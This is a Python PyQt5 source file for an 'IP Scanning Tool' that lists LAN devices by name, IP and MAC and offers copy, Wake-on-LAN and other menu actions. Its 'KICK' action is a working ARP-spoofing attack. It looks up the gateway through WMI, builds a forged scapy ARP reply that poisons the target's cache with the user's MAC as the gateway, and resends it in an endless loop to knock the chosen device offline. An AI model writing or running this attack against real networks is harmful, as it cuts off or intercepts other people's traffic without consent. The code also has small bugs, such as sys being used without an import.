import wmi
from scapy.all import (
    ARP,
    Ether,
    sendp,
    getmacbyip,
    get_if_hwaddr

)
import signal
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
import pyperclip
from PyQt5.QtWidgets import QMessageBox,QApplication
import ip
import wol
from mac import IP2MAC
import dname
from attack import *

addr = ip.find_local_ip()
args = "".join(addr)
ip_pre = '.'.join(args.split('.')[:-1])
ip.find_ip(ip_pre)
row_num = ip.live_ip

def build_packet(TargetIp, GateWayAddr):
        print("[-] Obtaining mac from {}".format(TargetIp))  # 打印信息
        TargetMacAddr = None
        while not TargetMacAddr:
            TargetMacAddr = getmacbyip(TargetIp)  # 获得ipd的mac地址
        MyMacAddr = get_if_hwaddr("WLAN")  # 获得我们网卡的mac地址
        pkt = Ether(src=MyMacAddr, dst=TargetMacAddr) / ARP(hwsrc=MyMacAddr, psrc=GateWayAddr, hwdst=TargetMacAddr,
                                                            pdst=TargetIp)
        pkt.show()
        print(pkt)
        return pkt

def stop(signal, frame):
        sys.exit(0)


class Thread(QThread):
    def __init__(self):
        super(Thread, self).__init__()
    def run(self):
        while True:
            sendp(packet, inter=2, iface="WLAN")  # inter表示发送包的间隔,iface表示我们的网卡
# row_num = 3
class TableWidgetContextMenu(QWidget):

    def __init__(self):
        super(TableWidgetContextMenu, self).__init__()
        self.initUI()

    def initUI(self):

        self.setWindowTitle("IP Scanning Tool" + "(" + str(ip.live_ip) + " devices" + ")")
        self.resize(1000, 600)
        layout = QHBoxLayout()
        self.tableWidget = QTableWidget()
        self.tableWidget.setRowCount(row_num)
        self.tableWidget.setColumnCount(3)
        layout.addWidget(self.tableWidget)
        self.tableWidget.setEditTriggers(QAbstractItemView.NoEditTriggers)  # 禁止编辑表格
        self.tableWidget.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)  # 列宽自适应
        # self.tableWidget.verticalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        a = 0
        while a < row_num:
            self.tableWidget.setRowHeight(a, 10)  # 行高
            a = a + 1

        arr = [[0] * 3 for _ in range(2000)]
        cc = 0
        ss = 0
        mac = []
        li = 0
        name1 = []
        aa = 0
#MAC地址
        for li in range(row_num):
            g = IP2MAC()
            mac.append(g.getMac(ip.ipaddress[li]))
            macadd = mac[li]
            if macadd is not None:
                macup = macadd.upper()
            else:
                macup = "Unknown"
            arr[li][2] = macup
            li = li + 1

        for cc in range(row_num):
            arr[cc][1] = ip.ipaddress[cc]
            cc = cc + 1
#设备名称
        for aa in range(row_num):
            if mac[aa] is not None:
                namen = dname.getname(mac[aa])
                if namen.startswith("{\"errors\":[\"Record Not Found.") is True:
                    namen = "Unknown"
                else:
                    a = namen.split("name\":")[1]
                    b = a.split(",\"")[0]
                    c = b.strip('"')
                    namen = c.upper()
            else:
                namen = "Unknown"
            arr[aa][0] = namen

        self.tableWidget.setHorizontalHeaderLabels(['Devices Name', 'IP Address', 'MAC Address'])

        for i in range(row_num + 1):
            for j in range(3):
                newItem = QTableWidgetItem(arr[i][j])
                newItem.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)  # 居中显示
                self.tableWidget.setItem(i, j, newItem)

        # 允许单机右键响应
        self.tableWidget.setContextMenuPolicy(Qt.CustomContextMenu)
        # 构建右键的点击事件
        self.tableWidget.customContextMenuRequested.connect(self.generateMenu)
        self.setLayout(layout)

    def generateMenu(self, pos):
        print(pos)
        # 获得右键所点击的索引值
        for i in self.tableWidget.selectionModel().selection().indexes():
            # 获得当前的行数目
            rowIndex = i.row()
            # 如果选择的索引小于2, 弹出上下文菜单
            if rowIndex < row_num:  # 写行数
                # 构造菜单
                menu = QMenu()
                # 添加菜单的选项
                item0 = menu.addAction("COPY NAME")
                item1 = menu.addAction("COPY IPV4 ADDRESS")
                item2 = menu.addAction("COPY MAC ADDRESS")
                item9 = menu.addAction("COPY ALL")
                item3 = menu.addAction("WOL")
                item4 = menu.addAction("PORT SCAN")
                item5 = menu.addAction("PING")
                item6 = menu.addAction("KICK")
                # 获得相对屏幕的位置
                screenPos = self.tableWidget.mapToGlobal(pos)
                # 被阻塞, 执行菜单
                action = menu.exec(screenPos)
                if action == item1:
                    pyperclip.copy(self.tableWidget.item(rowIndex, 1).text())
                elif action == item0:
                    pyperclip.copy(self.tableWidget.item(rowIndex, 0).text())
                elif action == item2:
                    pyperclip.copy(self.tableWidget.item(rowIndex, 2).text())
                elif action == item9:
                    pyperclip.copy(self.tableWidget.item(rowIndex, 0).text()+"\r"+self.tableWidget.item(rowIndex, 1).text()+"\n"+ self.tableWidget.item(rowIndex, 2).text() )
                elif action == item3:
                    deviceName = self.tableWidget.item(rowIndex, 0).text()
                    ipAdd = self.tableWidget.item(rowIndex, 1).text()
                    macAdd =  self.tableWidget.item(rowIndex, 2).text()
                    wol.wakeOn(deviceName, ipAdd, macAdd)
                    print("a")
                elif action == item4:
                    print("a")
                elif action == item5:
                    print("a")
                elif action == item6:
                    TargetIp = self.tableWidget.item(rowIndex, 1).text()  # 我ipad联网之后分配的ip
                    #自动获取当前网关
                    wmi_obj = wmi.WMI()
                    wmi_sql = "select DefaultIPGateway from Win32_NetworkAdapterConfiguration where IPEnabled=TRUE"
                    wmi_out = wmi_obj.query(wmi_sql)
                    #产生攻击发送包
                    for dev in wmi_out:
                        gao = dev.DefaultIPGateway[0]
                    GateWayAddr = gao  # 路由器地址/网关地址
                    signal.signal(signal.SIGINT, stop)
                    global packet
                    packet = build_packet(TargetIp, GateWayAddr)
                    #线程
                    self.show_child()
                    thread = Thread()
                    thread.start()

            else:
                return

    def show_child(self):
        self.child_window = Child()
        self.child_window.show()

class Child(QMainWindow):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        label = QLabel(self)
        label.resize(200, 100)
        label.setFrameStyle(QFrame.Panel | QFrame.Sunken)
        label.setText("系统正在运行")
        label.setAlignment(Qt.AlignBottom | Qt.AlignRight)
        self.setGeometry(500, 500, 250, 250)
        self.setWindowTitle('Processing')
        self.show()

    def closeEvent(self, event):
        reply = QMessageBox.question(self, '警告', "是否回到原界面", QMessageBox.Yes | QMessageBox.No, QMessageBox.No)

        if reply == QMessageBox.Yes:
            pass
        else:
            event.ignore()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    main = TableWidgetContextMenu()
    main.show()
    sys.exit(app.exec_())

